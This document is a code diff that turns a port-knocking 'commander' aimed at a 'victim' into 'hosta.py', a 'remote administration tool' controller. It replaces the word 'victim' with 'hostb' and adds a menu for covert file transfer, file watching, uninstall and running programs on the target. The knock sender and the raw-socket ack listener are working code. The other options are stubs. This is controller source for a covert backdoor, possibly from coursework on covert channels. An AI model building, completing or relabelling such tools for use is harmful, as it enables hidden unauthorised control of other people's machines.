@@ -1,8 +1,11 @@
 #!/usr/bin/env python3
-"""Commander: send the port-knock sequence to the victim.
+"""hosta: control center for the remote administration tool.
+
+Presents a menu. Option 1 port-knocks hostb and waits for the
+raw-socket ack that confirms the connection.
 
 Usage:
-    sudo python3 commander.py <victim_ip>
+    sudo python3 hosta.py <hostb_ip>
 """
 
 import socket
@@ -14,6 +17,19 @@ KNOCK_PORTS = (7000, 8000, 9000)
 KNOCK_DELAY_SECONDS = 0.1
 SOURCE_PORT = 54321
 TTL = 64
+ACK_TIMEOUT_SECONDS = 5.0
+TCP_ACK_FLAG = 0x10
+
+MENU_OPTIONS = (
+    "Connect to hostb",
+    "Disconnect from hostb",
+    "Uninstall from hostb",
+    "Transfer file to hostb",
+    "Transfer file from hostb",
+    "Watch file on hostb",
+    "Watch directory on hostb",
+    "Run program on hostb",
+)
 
 
 def detect_source_ip(destination_ip: str) -> str:
@@ -94,18 +110,9 @@ def send_single_knock(
     raw_socket.sendto(ip_header + tcp_header, (destination_ip, destination_port))
 
 
-def main() -> int:
-    if len(sys.argv) != 2:
-        print("Usage: sudo python3 commander.py <victim_ip>", file=sys.stderr)
-        return 2
-
-    destination_ip = sys.argv[1]
-    source_ip = detect_source_ip(destination_ip)
-
+def send_port_knock_sequence(destination_ip: str, source_ip: str) -> None:
     raw_socket = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
     raw_socket.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
-
-    print(f"knocking {destination_ip} from {source_ip}")
     try:
         for knock_index, destination_port in enumerate(KNOCK_PORTS):
             if knock_index > 0:
@@ -115,7 +122,86 @@ def main() -> int:
     finally:
         raw_socket.close()
 
-    return 0
+
+def wait_for_connection_ack(
+    recv_socket: socket.socket, hostb_ip: str, timeout_seconds: float
+) -> bool:
+    deadline = time.time() + timeout_seconds
+    while True:
+        remaining = deadline - time.time()
+        if remaining <= 0:
+            return False
+        recv_socket.settimeout(remaining)
+        try:
+            packet, _ = recv_socket.recvfrom(65535)
+        except socket.timeout:
+            return False
+
+        if len(packet) < 40:
+            continue
+        ip_header_length = (packet[0] & 0x0F) * 4
+        if len(packet) < ip_header_length + 20:
+            continue
+        if socket.inet_ntoa(packet[12:16]) != hostb_ip:
+            continue
+
+        tcp_header = packet[ip_header_length:ip_header_length + 20]
+        _src, dst_port, _seq, _ack, _offset, flags, _win, _chk, _urg = struct.unpack(
+            "!HHLLBBHHH", tcp_header
+        )
+        if dst_port != SOURCE_PORT:
+            continue
+        if flags & TCP_ACK_FLAG:
+            return True
+
+
+def connect_to_hostb(destination_ip: str) -> None:
+    print("\n=== Connect ===")
+    source_ip = detect_source_ip(destination_ip)
+    # Open the recv socket first so we don't miss an ack that arrives
+    # before we finish sending the knocks.
+    recv_socket = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
+    try:
+        print(f"knocking {destination_ip} from {source_ip}")
+        send_port_knock_sequence(destination_ip, source_ip)
+        print("sent 3 knock packets, waiting for ack...")
+        if wait_for_connection_ack(recv_socket, destination_ip, ACK_TIMEOUT_SECONDS):
+            print("connection established")
+        else:
+            print("connection failed: no ack from hostb")
+    finally:
+        recv_socket.close()
+
+
+def print_menu() -> None:
+    print("\n--- hosta menu ---")
+    for index, label in enumerate(MENU_OPTIONS, start=1):
+        print(f"  {index}) {label}")
+
+
+def main() -> int:
+    if len(sys.argv) != 2:
+        print("Usage: sudo python3 hosta.py <hostb_ip>", file=sys.stderr)
+        return 2
+    destination_ip = sys.argv[1]
+
+    while True:
+        print_menu()
+        try:
+            choice = input("choice> ").strip()
+        except (EOFError, KeyboardInterrupt):
+            print()
+            return 0
+
+        if choice == "1":
+            try:
+                connect_to_hostb(destination_ip)
+            except PermissionError:
+                print("permission denied (raw sockets require sudo)")
+        elif choice in {"2", "3", "4", "5", "6", "7", "8"}:
+            print("not implemented yet")
+        else:
+            print("invalid choice")
 
 
 if __name__ == "__main__":
